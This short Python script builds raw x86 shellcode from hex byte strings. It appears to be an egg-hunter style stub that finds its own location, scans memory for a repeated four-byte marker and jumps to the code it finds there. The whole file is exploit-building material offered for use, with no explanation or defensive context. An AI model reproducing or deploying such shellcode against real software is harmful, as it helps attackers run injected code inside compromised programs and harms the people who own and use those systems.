#!/usr/bin/python

spin = \
   "\xeb\x1e"

start = \
   "\x59\x51\xff\x31\x59\x58\x31\xdb\xb3\x04\x01\xd8\xf6\xdb\x20\xd8"\
   "\xf6\xdb"

findit = \
   "\x01\xd8\x3b\x08\x75\xfa"

found = \
   "\x01\xd8\x50\x59\xff\xe1"

end = \
   "\xe8\xdd\xff\xff\xff"

# marker
data = \
   "\x51\x51\x51\x51"

def build():
   tmp = \
      spin + \
      start + \
      findit + \
      found + \
      end + \
      data
   return tmp
